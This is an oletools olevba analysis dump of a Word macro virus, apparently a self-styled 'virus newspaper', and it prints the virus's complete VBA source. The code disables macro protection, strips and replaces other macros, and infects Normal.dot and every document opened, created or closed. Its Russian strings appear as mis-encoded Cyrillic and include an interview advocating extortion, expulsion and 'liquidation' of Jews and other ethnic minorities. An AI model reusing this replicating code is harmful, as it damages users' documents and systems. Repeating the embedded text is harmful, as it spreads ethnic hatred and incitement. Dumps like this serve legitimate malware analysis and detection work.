olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const E_Marker = "VirusZeitung" 'ñèãíàòóðà âèðóñà
'èó îäë:ÀêäéÔíðâêé ëêàä ôåî  èàëØòëâ@Âðññçàè ðàè èàåñè,ÀåñíðÅðìâèÌõè ààî
'1
'íîìåð 1 çà 2000 ãîä
Dim ad, nt As Object
Dim sd, snt As Boolean
 
Private Function NormalKontam()
 If Not nt.codemodule.Find(E_Marker, 1, 1, 10000, 10000) Then
  NormalKontam = 0
 Else
  If nt.codemodule.countoflines < 3 Then
   NormalKontam = 0
  Else
   ant$ = Trim(nt.codemodule.lines(3, nt.codemodule.countoflines))
   ant$ = Mid(ant$, 2, Len(ant$) - 1)
   If Val(Trim(ant$)) < 65535 Then
    NormalKontam = Val(Trim(ant$))
   Else
    NormalKontam = -1
   End If
  End If
 End If
End Function

Private Function ADokumKontam()
 If Not ad.codemodule.Find(E_Marker, 1, 1, 10000, 10000) Then
  ADokumKontam = 0
 Else
  If ad.codemodule.countoflines < 3 Then
   ADokumKontam = 0
  Else
   ant$ = Trim(ad.codemodule.lines(3, ad.codemodule.countoflines))
   ant$ = Mid(ant$, 2, Len(ant$) - 1)
   If Val(Trim(ant$)) < 65535 Then
    ADokumKontam = Val(Trim(ant$))
   Else
    ADokumKontam = -1
   End If
  End If
 End If
End Function

Private Sub VirusArbeit()
 On Error Resume Next
 Options.VirusProtection = False
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If (ADokumKontam < NormalKontam) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  sd = ActiveDocument.Saved
  If ad.codemodule.countoflines > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â äîêóìåíòå äî âíåäðåíèÿ âèðóñà"
   For v = 1 To ad.codumodule.countoflines
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, ad.codemodule.countoflines
  End If
  For v = 1 To nt.codemodule.countoflines
   ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
 End If
 
 If ADokumKontam > NormalKontam Then
  snt = NormalTemplate.Saved
  If nt.codemodule.countoflines > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â øàáëîíå Normal.dot"
   For v = 1 To nt.codemodule.countoflines
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, nt.codemodule.countoflines
  End If
  For v = 1 To ad.codemodule.countoflines
   nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
  Next v
  If snt = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub

Private Sub HauptArbeit(p)
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then
  p = 2
 End If
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then
  p = 2
 End If
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then
  p = 2
 End If
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then
  p = 2
 End If
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then
  p = 2
 End If
  
 If Rnd >= p Then
  Exit Sub
 End If
 Z_Kopf
 
 Druck_0 Artikel_1$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_1$(2, ab_) <> ""
  Druck_0 Artikel_1$(2, ab_), 14, False, wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_1$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Druck_0 Artikel_2$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_2$(2, ab_) <> ""
  Druck_0 Artikel_2$(2, ab_), 14, False, wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_2$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Druck_0 Artikel_3$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_3$(2, ab_) <> ""
  Druck_0 Artikel_3$(2, ab_), 14, ab_ / 2 <> Int(ab_ / 2), wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_3$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Z_Sub
End Sub

Private Sub Document_Close()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Document_New()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Document_Open()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Z_Kopf()
 Druck_0 "À Ä Ñ Ê È É   Î Ã Î Í Ü", 40, True, wdAlignParagraphCenter, 0
 Druck_0 "Âèðóñíàÿ ãàçåòà ñåêòû èì. Äæ. Äè è Ý. Êåëëè.", 18, False, wdAlignParagraphLeft, 0
 Druck_0 "Âûõîä ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà", 18, False, wdAlignParagraphLeft, 0
 Druck_0 "5  ÿíâàðÿ  2000  ã.   ¹ 1 (1)", 18, False, wdAlignParagraphLeft, 0
 Selection.TypeParagraph
 Druck_0 "Ñåãîäíÿ â íîìåðå:", 18, True, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_1$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_2$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_3$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 Selection.TypeParagraph
End Sub

Private Sub Z_Sub()
 Selection.TypeParagraph
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ó÷ðåäèòåëü - ñàòàíèíñêàÿ ñåêòà èìåíè Äæîíà Äè è Ýäâàðäà Êåëëè", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ãëàâíûé ðåäàêòîð - Â. Ä. Òàðàñêèí", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Äèðåêòîð - Ã. Ñ. Ëèñóíîâ", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Àâòîð èäåè - À. Í. Ãåíîâà", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Êîíñóëüòàíò ïî âîïðîñàì âèðóñîëîãèè -  Ï. Â. Íîãèí", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ãëàâíûé ïðîãðàììèñò - À. Â. Ðûæîâ", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Êîìïüþòåðíûé íàáîð è îôîðìëåíèå - Ò. Â. Çóáîâà", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ìíåíèå ðåäàêöèè ìîæåò íå ñîâïàäàòü ñ ïîçèöèåé àâòîðîâ ïóáëèêàöèé.", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ïðè ïåðåïå÷àòêå è èñïîëüçîâàíèè ìàòåðèàëîâ ññûëêà íà ãàçåòó íåîáÿçàòåëüíà.", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ðåäàêöèÿ íå íåñåò îòâåòñòâåííîñòè çà ñîäåðæàíèå ïóáëèêóåìûõ ìàòåðèàëîâ.", 14, False, wdAlignParagraphCenter, 0
End Sub

Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind)
 Selection.Font.Size = Siz
 Selection.Font.Bold = Bld
 Selection.ParagraphFormat.Alignment = Alg
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind)
 Selection.TypeParagraph
 Selection.TypeText Text:=T
End Sub

Private Function Artikel_1$(T, Ab)
 If T = 1 Then
  Artikel_1$ = "ÐÎÆÄÅÍÈÅ  ÍÎÂÎÃÎ  ÈÇÄÀÍÈß"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_1$ = "Óâàæàåìûå ÷èòàòåëè! Âû ïðèñóòñòâóåòå ïðè óíèêàëüíîì ñîáûòèè: ðîæäàåòñÿ íå ïðîñòî íîâîå èçäàíèå, êàê ñëåäóåò èç çàãîëîâêà, à ïðèíöèïèàëüíî íîâûé òèï ïåðèîäè÷åñêîãî èçäàíèÿ - âèðóñíàÿ ãàçåòà. Â íûíåøíåå âðåìÿ èíôîðìàöèîííûå òåõíîëîãèè ïðî÷íî âîøëè â íàø áûò; ïî÷òè êàæäûé ÷åëîâåê çíàåò, ÷òî òàêîå êîìïüþòåð, èëè äàæå èìååò åãî ó ñåáÿ äîìà; ìû íå ìûñëèì ñâîåé æèçíè áåç Internet'à. Âñå çíàþò (õîòÿ áû ïîíàñëûøêå) î êîìïüþòåðíûõ âèðóñàõ, è ñîçäàâàåìûõ èìè ïðîáëåìàõ. Äî ñèõ ïîð áûòîâàëî ìíåíèå, ÷òî êîìïüþòåðíûé âèðóñ ìîæåò ïðèíîñèòü òîëüêî âðåä, îäíàêî ìû ïîñòàâèëè ñâîåé öåëüþ îïðîâåðãíóòü äàííîå çàÿâëåíèå, íàéäÿ âèðóñó ïîëåçíîå ïðèìåíåíèå."
   Case 1
    Artikel_1$ = "Êàê èçâåñòíî, âî âñå âðåìåíà ñðåäñòâà ìàññîâîé èíôîðìàöèè (çäåñü è äàëåå - ÑÌÈ) èãðàëè âàæíóþ ðîëü â æèçíè îáùåñòâà. Îñîáûì ñïðîñîì ïîëüçóþòñÿ ÑÌÈ, íå êîíòðîëèðóåìûå ðàçíîãî ðîäà âëàñòíûìè ñòðóêòóðàìè, à òàêæå íå ïðåäúÿâëÿþùèå ïîâûøåííûõ òðåáîâàíèé ê ñâîèì ÷èòàòåëÿì. Ê ïðèìåðó: ìíîãèå õîòÿò ïîìåùàòü ñâîè îáúÿâëåíèÿ àíîíèìíî è ïî âîçìîæíîñòè áåñïëàòíî, ïóáëèêîâàòü ïîä âûìûøëåííûì èìåíåì èëè àíîíèìíî ìàòåðèàëû ëþáîãî îáúåìà è ñîäåðæàíèÿ è ò.ï. Îôèöèàëüíûå èçäàíèÿ äåëàþò òàêîå íåâîçìîæíûì èëè êðàéíå çàòðóäíÿþò, ÷åì âûçûâàþò çàêîííóþ íåïðèÿçíü ó áîëüøèíñòâà ãðàæäàí. Íàøà ãàçåòà  íå èìååò äàííûõ íåäîñòàòêîâ, òàê êàê ÿâëÿåòñÿ íåëåãàëüíîé, è êàê ñëåäñòâèå - ïîäïîëüíîé. Ïîäïîëüíûå ãàçåòû ñóùåñòâîâàëè è ðàíåå, îäíàêî èõ èçäàíèå è ðàñïðîñòðàíåíèå áûëî ñâÿçàíî ñ áîëüøèì ðèñêîì êàê äëÿ ÷èòàòåëåé, òàê è äëÿ èçäàòåëåé. " & _
    "Òî æå ñàìîå ìîæíî ñêàçàòü è î ðàñïðîñòðàíåíèè ëèñòîâîê. Ýòè íåäîñòàòêè ìîãóò áûòü óñòðàíåíû ïðè ïîìîùè ïåðåâîäà ãàçåòû íà íîâóþ îñíîâó, èñêëþ÷àþùóþ èëè ñâîäÿùóþ ê ìèíèìóìó êîíòàêò ÷èòàòåëåé ñ èçäàòåëüñòâîì. Â êà÷åñòâå òàêîé îñíîâû áûëî ðåøåíî èñïîëüçîâàòü êîìïüþòåðíûé âèðóñ, òàê êàê îí ñïîñîáåí ðàñïðîñòðàíÿòüñÿ áåç âìåøàòåëüñòâà ÷åëîâåêà âåçäå, ãäå åñòü âîñïðèèì÷èâûå ê íåìó êîìïüþòåðû."
   Case 2
    Artikel_1$ = "Êàê èçâåñòíî, êîìïüþòåðíûå âèðóñû êëàññèôèöèðóþòñÿ ïî íåñêîëüêèì ïðèçíàêàì, â ÷àñòíîñòè, ïî ñòåïåíè ïðè÷èíÿåìîãî èìè âðåäà. Âèðóñû, íàçûâàåìûå ""áåçâðåäíûìè"", òîëüêî ðàçìíîæàþòñÿ è çàíèìàþò ïàìÿòü; òàê íàçûâàåìûå ""íåîïàñíûå"" âèðóñû â äîïîëíåíèå ê  ïåðå÷èñëåííîìó ïðîèçâîäÿò ðàçëè÷íûå çâóêîâûå, ãðàôè÷åñêèå è ïðî÷èå ýôôåêòû. Îñòàëüíûå ðàçíîâèäíîñòè âèðóñîâ ìû íå áóäåì ðàññìàòðèâàòü, òàê êàê îíè íå ïîòðåáóþòñÿ äëÿ äàëüíåéøåãî îáúÿñíåíèÿ. Äî ñèõ ïîð âèðóñû, îòíîñèìûå ê ""íåîïàñíûì"", âûâîäèëè òîëüêî ñîîáùåíèÿ, íå èìåþùèå â áîëüøèíñòâå ñëó÷àåâ, íèêàêîé ïðàêòè÷åñêîé öåííîñòè; îäíàêî, íå òðåáóåò äîêàçàòåëüñòâ, ÷òî òàêîé âèðóñ â ïðèíöèïå ìîæåò âûâåñòè íà ýêðàí òåêñò ãàçåòû èëè ëèñòîâêè. Ñòîèò òîëüêî îñíàñòèòü âèðóñ òàêîé ""íà÷èíêîé"", è îí ñòàíîâèòñÿ ñîîòâåòñòâåííî ãàçåòîé èëè ëèñòîâêîé, êîòîðàÿ ðàñïðîñòðàíÿåò ñåáÿ ñàìà. Ïðè ýòîì âîçíèêàåò ñëåäóþùàÿ ïðîáëåìà: ãàçåòà âûõîäèò ïåðèîäè÷åñêè, è åå íîâûå íîìåðà äîëæíû âûòåñíÿòü èç ñðåäû îáèòàíèÿ ñòàðûå. Ïîäîáíîå íå ÿâëÿåòñÿ íåâîçìîæíûì äëÿ " & _
    "êîìïüþòåðíûõ âèðóñîâ: íåêîòîðûå èç íèõ ñíàáæåíû ìåõàíèçìîì îáíîâëåíèÿ âåðñèè, ÷òî ïðè ñîîòâåòñòâóþùåé äîðàáîòêå ìîæåò áûòü ïðèìåíåíî äëÿ çàìåíû ñòàðîãî íîìåðà ãàçåòû íîâûì. Äëÿ ðåàëèçàöèè òàêîé ãàçåòû íåîáõîäèìî âûáðàòü ñðåäó îáèòàíèÿ âèðóñà. Íàèáîëåå öåëåñîîáðàçíûì ïðåäñòàâëÿåòñÿ ðàñïðîñòðàíåíèå ïîäïîëüíîé ãàçåòû ïðè ïîìîùè ìàêðîâèðóñà, òàê êàê â íàñòîÿùåå âðåìÿ ÷àùå âñåãî ñ êîìïüþòåðà íà êîìïüþòåð ïåðåíîñÿò äîêóìåíòû è ýëåêòðîííûå òàáëèöû, êîòîðûå ÿâëÿþòñÿ ñðåäîé îáèòàíèÿ òàêèõ âèðóñîâ."
   Case 3
    Artikel_1$ = "Íàøà ñåêòà áûëà ñîçäàíà â 1991 ãîäó, îäíàêî äî ñèõ ïîð íå èìåëà ñâîåãî ïå÷àòíîãî îðãàíà, ÷òî ÿâëÿåòñÿ ñåðüåçíûì íåäîñòàòêîì. Èíîãäà ìû ïî ðàçíûì ïîâîäàì ïèñàëè â ðàçëè÷íûå ãàçåòû, íî íàøè ìàòåðèàëû óïîðíî íå ïóáëèêîâàëèñü, çà èñêëþ÷åíèåì îäíîãî ðàçà. Òåïåðü ìû ðåøèëè äàííóþ ïðîáëåìó ïóòåì ñîçäàíèÿ ñîáñòâåííîé âèðóñíîé ãàçåòû. Íå ñëåäóåò äóìàòü, îäíàêî, ÷òî çäåñü áóäóò ïå÷àòàòüñÿ òîëüêî ìàòåðèàëû íàøèõ ñåêòàíòîâ; íàîáîðîò, ìû ñòàðàåìñÿ áûòü îòêðûòûìè äëÿ âñåõ, âíå çàâèñèìîñòè îò âåðîèñïîâåäàíèÿ, íàöèîíàëüíîñòè è ïîëèòè÷åñêèõ óáåæäåíèé. Ãàçåòà âûõîäèò ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà. Â áëèæàéøåì áóäóùåì áóäåò îïóáëèêîâàí ñïîñîá ñâÿçè ñ íàøåé ðåäàêöèåé, êîòîðûì ñìîæåò âîñïîëüçîâàòüñÿ êàæäûé, êòî çíàêîì ñ ÿçûêîì ïðîãðàììèðîâàíèÿ Visual Basic. Äëÿ òåõ, êòî íå çíàêîì ñ ïðîãðàììèðîâàíèåì, â ãîðîäå èìååòñÿ ñåòü êîððåñïîíäåíòîâ."
   Case 4
    Artikel_1$ = "Áîëåå ïîäðîáíî î âèðóñå ðàññêàæåò íèæå íàø ãëàâíûé ïðîãðàììèñò Àëåêñàíäð Ðûæîâ."
   Case Else
    Artikel_1$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_1$ = "Ãëàâíûé ðåäàêòîð    Â. Ä. Òàðàñêèí"
 End If
End Function

Private Function Artikel_2$(T, Ab)
 If T = 1 Then
  Artikel_2$ = "ÃÀÇÅÒÍÛÉ ÂÈÐÓÑ: ×ÒÎ ÝÒÎ ÒÀÊÎÅ ?"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_2$ = "Ñðàçó ñïåøó óñïîêîèòü íàøèõ ÷èòàòåëåé: âèðóñ, ðàñïðîñòðàíÿþùèé ãàçåòó ""Àäñêèé îãîíü"", íå èìååò íèêàêèõ âñòðîåííûõ äåñòðóêòèâíûõ ôóíêöèé è íå ñîäåðæèò îøèáîê, çàòðóäíÿþùèõ ðàçìíîæåíèå èëè óãðîæàþùèõ ðàçðóøåíèåì äàííûõ."
   Case 1
    Artikel_2$ = "Âèðóñ, êîòîðûé ìû óñëîâíî íàçûâàåì ""Inferno"", ïðåäñòàâëÿåò ñîáîé ìàêðîâèðóñ, ïîðàæàþùèé äîêóìåíòû â ôîðìàòå Microsoft Word. Îí ñîñòîèò èç ðÿäà ïðîöåäóð, êîòîðûå îáåñïå÷èâàþò åãî ðàçìíîæåíèå, ñìåíó ñòàðîãî íîìåðà íîâûì, ñîáñòâåííî ïå÷àòü ìàòåðèàëîâ, à òàêæå àâòîìàêðîñû, çàïóñêàåìûå ïðè îòêðûòèè, çàêðûòèè è ñîçäàíèè íîâîãî ôàéëà. Ïåðâàÿ ñòðîêà ñîäåðæèò ñèãíàòóðó âèðóñà, âòîðàÿ - àâòîðñêèé çíàê, à òðåòüÿ - ñòðîêîâóþ çàïèñü íîìåðà ãàçåòû. Âî âòîðîé ñòðîêå çàêîäèðîâàíû èìåíà è ôàìèëèè àâòîðîâ âèðóñà, êîòîðûå ïðîäàëè íàì òåêñò ïðîãðàììû è ïîæåëàëè îñòàòüñÿ íåèçâåñòíûìè."
   Case 2
    Artikel_2$ = "Ïðè îòêðûòèè çàðàæåííîãî ôàéëà îòêëþ÷àåòñÿ ïðîâåðêà äîêóìåíòîâ íà ïðåäìåò íàëè÷èÿ ìàêðîñîâ, ïðîèñõîäèò çàðàæåíèå øàáëîíà NORMAL.DOT (åñëè îí íå çàðàæåí, èëè çàðàæåí áîëåå ðàííèì íîìåðîì ãàçåòû). Åñëè øàáëîí óæå ñîäåðæèò êàêèå-ëèáî ìàêðîñû, òî îíè ïåðåíîñÿòñÿ â òåêñòîâûé ôàéë NORMAL.TXT. Åñëè ôàéë ñ òàêèì èìåíåì óæå ñóùåñòâóåò, òî ïåðåíîñèìûå ìàêðîñû äîáàâëÿþòñÿ ê íåìó."
   Case 3
    Artikel_2$ = "Çàòåì êàæäûé íîâûé ôàéë, îñíîâàííûé íà ýòîì øàáëîíå áóäåò çàðàæàòüñÿ ïðè ñîçäàíèè è ïðè çàêðûòèè. Åñëè îí óæå ñîäåðæèò êàêèå-íèáóäü ìàêðîñû, òî îíè òàêæå ïåðåíîñÿòñÿ â òåêñòîâûé ôàéë (*.TXT), èìÿ êîòîðîãî ñîâïàäàåò ñ èìåíåì ôàéëà äîêóìåíòà."
   Case 4
    Artikel_2$ = "Â çàâèñèìîñòè îò ñëó÷àéíîãî ñ÷åò÷èêà (â îïðåäåëåííûå äíè îáÿçàòåëüíî) â ðåäàêòèðóåìûé äîêóìåíò âñòàâëÿåòñÿ òåêñò ãàçåòû."
   Case Else
    Artikel_2$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_2$ = "Ãëàâíûé ïðîãðàììèñò ñåêòû   À. Â. Ðûæîâ"
 End If
End Function

Private Function Artikel_3$(T, Ab)
 If T = 1 Then
  Artikel_3$ = "ÃÄÅ  ÆÅ  ÂÛ,  ÐÓÑÑÊÈÅ  ?"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_3$ = "Ïåðâûé ìàòåðèàë, îïóáëèêîâàííûé â íàøåé ãàçåòå, ïîñâÿùåí íàöèîíàëüíîìó âîïðîñó. Íàø êîððåñïîíäåíò Ì. Â. ×óðèëîâ áåñåäóåò ñ ãëàâîé àñòðàõàíñêîãî ôèëèàëà ""Ðóññêîãî íàöèîíàëüíîãî åäèíñòâà""."
   Case 1
    Artikel_3$ = "- Íàçîâèòå, ïîæàëóéñòà ñåáÿ."
   Case 2
    Artikel_3$ = "- Ââèäó îïàñíîñòè ìîåé ðàáîòû ÿ íå ìîãó íàçâàòü ñâîå íàñòîÿùåå èìÿ; ó ìåíÿ åñòü ïñåâäîíèì, êîòîðûé ÿ âàì ñîîáùó: Ñàïóãèí Åâãåíèé Àíàòîëüåâè÷. Òàê ìåíÿ è çîâèòå."
   Case 3
    Artikel_3$ = "- Èìÿ è îò÷åñòâî íàñòîÿùèå ?"
   Case 4
    Artikel_3$ = "- Îá ýòîì äîãàäûâàéòåñü ñàìè."
   Case 5
    Artikel_3$ = "- ×òî âû ïîäðàçóìåâàåòå ïîä ""ðàáîòîé"", êîòîðàÿ ñîïðÿæåíà ñ òàêîé îïàñíîñòüþ ?"
   Case 6
    Artikel_3$ = "- Ãëàâíàÿ öåëü íàøåé îðãàíèçàöèè ñîñòîèò â òîì, ÷òîáû î÷èñòèòü Ðîññèþ îò ðàçíîãî ðîäà ýòíè÷åñêîãî ìóñîðà, êîòîðûé çàãëóøàåò âñå èñêîííî ðóññêîå, è íå äàåò ñòðàíå íîðìàëüíî æèòü. Ýòîò ìóñîð íå õî÷åò áûòü âûìåòåííûì, è ïûòàåòñÿ ðàçäåëàòüñÿ ñ íàìè, â ñâÿçè  ñ ÷åì ïðåäñòàâëÿåò áîëüøóþ îïàñíîñòü. Åñëè âû âíèìàòåëüíî ïðèãëÿíåòåñü ê òåïåðåøíåé ñèòóàöèè, òî íå ìîæåòå íå çàìåòèòü, ÷òî ïî÷òè íà êàæäîì êëþ÷åâîì ïîñòó, èìåþùåì õîòü êàêîå-òî çíà÷åíèå, ñèäèò êàêîé-íèáóäü èíîðîäåö (÷àùå âñåãî - åâðåé) è âüåò âåðåâêè èç íàñòîÿùèõ ðóññêèõ. Íå çàáûâàéòå, ÷òî ìû - ãîñóäàðñòâîîáðàçóþùàÿ íàöèÿ, è äîëæíû çàùèùàòüñÿ îò òàêîé ïàäàëè âñåìè äîñòóïíûìè è íåäîñòóïíûìè ñðåäñòâàìè."
   Case 7
    Artikel_3$ = "- Êàêèå ñðåäñòâà Âû èìååòå â âèäó?"
   Case 8
    Artikel_3$ = "- Â íà÷àëå íàì ïðèäåòñÿ äåéñòâîâàòü íåëåãàëüíûìè ìåòîäàìè. Èíîðîäöû ñèäÿò âåçäå è ïûòàþòñÿ âñåìè ñðåäñòâàìè îòòåñíèòü íàñ îò ðû÷àãîâ óïðàâëåíèÿ; íàãëÿäíûì ïðèìåðîì òîãî ÿâëÿåòñÿ çàïðåùåíèå ïàðòèè ""Ðóññêîå íàöèîíàëüíîå åäèíñòâî"" è îòìåíà ðåãèñòðàöèè äâèæåíèÿ ""Ñïàñ"". Çà ýòî îíè äîëæíû ïîíåñòè è ïîíåñóò ñóðîâîå íàêàçàíèå, íî ñíà÷àëà èç íèõ íåîáõîäèìî âûæàòü âñå, ÷òî ìîæåò ïîéòè íà ïîëüçó Ðîññèè, òî åñòü äåíüãè, èìóùåñòâî, çíàíèÿ, îïûò è ìíîãîå äðóãîå. Ïîñêîëüêó îíè íå îòäàäóò íè÷åãî äîáðîâîëüíî, íàì ïðèäåòñÿ âçÿòü ýòî ñèëîé. Âñå áîãàòûå åâðåè è ïðî÷èå èíîðîäöû äîëæíû áûòü â íà÷àëå îáëîæåíû íàëîãîì íà ïðàâî æèòü â Ðîññèè èëè ïðèâëåêàòüñÿ ê ðàçíîãî ðîäà ïðèíóäèòåëüíûì âèäàì äåÿòåëüíîñòè. Çà îòêàç îò óïëàòû äîëæíà ñëåäîâàòü ðàñïðàâà íàä äîëæíèêîì èëè åãî ðîäíûìè."
   Case 9
    Artikel_3$ = "- Ïðàâèëüíî ëè ÿ ïîíÿë, ÷òî Âû ïðåäëàãàåòå îáû÷íûé ðýêåò âñåõ ñîñòîÿòåëüíûõ èíîðîäöåâ ?"
   Case 10
    Artikel_3$ = "- Äà, íåêîòîðûå íàçûâàþò ýòî òàêèì îáðàçîì."
   Case 11
    Artikel_3$ = "- À êàê âû îòíîñèòåñü ê ðóññêèì, ñîñòîÿùèì â ñìåøàííûõ áðàêàõ?"
   Case 12
    Artikel_3$ = "- ß ñ÷èòàþ òàêèõ ëþäåé ïðåäàòåëÿìè ñâîåé íàöèè, êîòîðûå çàñîðÿþò ãåíîôîíä ðóññêîãî íàðîäà ðàçíûì äåðüìîì; îíè äîëæíû îáëàãàòüñÿ íàðàâíå ñ âûøåóïîìÿíóòûìè êàòåãîðèÿìè ãðàæäàí. Ðîæäåííûå â òàêèõ áðàêàõ äåòè-ïîëóêðîâêè ïîäëåæàò òîìó æå îáëîæåíèþ."
   Case 13
    Artikel_3$ = "- Êàê ïîíèìàòü ñëîâî ""ïîëóêðîâêè"" ?  Íå ïûòàåòåñü ëè Âû ââåñòè êóëüò ""÷èñòîòû êðîâè"", âîñïåòûé êîãäà-òî Ãèòëåðîì è åãî ïîäðó÷íûìè?"
   Case 14
    Artikel_3$ = "- ""×èñòîòà êðîâè"" åñòü íàøà ïðîãðàììà-ìàêñèìóì, îäíàêî äî íåå íàì åùå î÷åíü äàëåêî. Äåëî â òîì, ÷òî íàø ãåíîôîíä ñèëüíî çàñîðåí, è åãî î÷èñòêà ïîòðåáóåò íåìàëîãî âðåìåíè; ñåé÷àñ ìû äîëæíû îñòàíîâèòü, íàñêîëüêî ýòî âîçìîæíî, ïðîöåññ åãî äàëüíåéøåãî çàñîðåíèÿ. Îñîáåííî îïàñíû â ýòîì îòíîøåíèè åâðåè: ýòîò íàðîä äîëãîå âðåìÿ ïîäâåðãàë ñåáÿ èíáðèäèíãó, â ðåçóëüòàòå ÷åãî íàêîïèë ãðîìàäíîå êîëè÷åñòâî îïàñíûõ, âïëîòü äî ëåòàëüíûõ ãåíîâ. Îíè â ïåðâóþ î÷åðåäü äîëæíû áûòü âûñëàíû çà ïðåäåëû Ðîññèè èëè ëèêâèäèðîâàíû. ×òî æå êàñàåòñÿ Ãèòëåðà, òî êóëüò ""÷èñòîòû êðîâè"" è ãåíîöèä åâðååâ ïðèäóìàëè çàäîëãî äî íåãî; îí òîëüêî óñîâåðøåíñòâîâàë ýòî."
   Case 15
    Artikel_3$ = "- Êàêèå êîíêðåòíûå äåéñòâèÿ âû ïðåäïðèíèìàåòå â äàííîì íàïðàâëåíèè ?"
   Case 16
    Artikel_3$ = "- Ìû îòîáðàëè íàèáîëåå ÷èñòîêðîâíûõ ëþäåé ñðåäè ñâîèõ ÷ëåíîâ, è ïûòàåìñÿ âîçðîäèòü ñâîé èñêîííûé ãåíîôîíä, íàñêîëüêî ýòî äîïóñêàåò âîçìîæíîñòü. Äåíüãè, íåîáõîäèìûå äëÿ íàøåé äåÿòåëüíîñòè, áóäåì âûêîëà÷èâàòü èç ñîñòîÿòåëüíûõ åâðååâ, òàòàð è ïðî÷èõ âûðîäêîâ, ïî íåäîðàçóìåíèÿ îêàçàâøèõñÿ â ýòîé ñòðàíå."
   Case 17
    Artikel_3$ = "- Âàì íå êàæåòñÿ, ÷òî â Àñòðàõàíè òàêàÿ çàäà÷à ìîæåò îêàçàòüñÿ ÷ðåçâû÷àéíî òðóäíîé, âåäü ïðîöåíò ðóññêèõ  çäåñü âåñüìà íåâåëèê ?"
   Case 18
    Artikel_3$ = "- Ìû â ýòîì óâåðåíû, íî ê òðóäíîñòÿì ïðèâûêëè, è ñ÷èòàåì çàäà÷ó âïîëíå ðàçðåøèìîé. Êàê ãîâîðèòñÿ â ïîãîâîðêå: ""äîðîãó îñèëèò èäóùèé""."
   Case 19
    Artikel_3$ = "- Æåëàþ Âàì óñïåõà. Âñåãî õîðîøåãî !"
